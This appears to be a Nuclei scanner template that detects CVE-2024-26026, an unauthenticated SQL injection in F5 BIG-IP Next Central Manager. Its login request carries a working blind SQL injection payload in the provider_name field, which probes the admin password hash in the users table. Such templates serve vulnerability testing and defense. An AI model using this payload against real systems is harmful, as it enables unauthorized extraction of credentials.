id: CVE-2024-26026

info:
  name: F5 BIG-IP Next Central Manager SQL Injection
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    F5 BIG-IP Next Central Manager is vulnerable to a SQL injection vulnerability, allowing attackers to extract sensitive information from the database without authentication.
    可以通过组合CVE-2024-21793使用
  reference:
    - https://github.com/wy876/POC/blob/17fce9e8a8e4c711753f586f24a2b8351f367aee/F5-BIG-IP/F5-BIG-IP%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(CVE-2024-26026)%26(CVE-2024-21793).md
  tags: F5-BIGIP

http:
  - raw:
      - |
        POST /api/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {
          "username": "fake_user",
          "password": "password",
          "provider_type": "LDAP",
          "provider_name": "LDAPP'or' name = (select case when (password like concat(chr(97)||chr(100)||chr(109)||chr(105)||chr(110)||'%')) then chr(76)||chr(111)||chr(99)||chr(97)||chr(108) else chr(76) end from mbiq_system.users where username like concat(chr(97)||chr(100)||chr(109)||chr(105)||chr(110)) limit 1)"
        }

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "root distinguished name is required"
        part: body
      - type: status
        status:
          - 200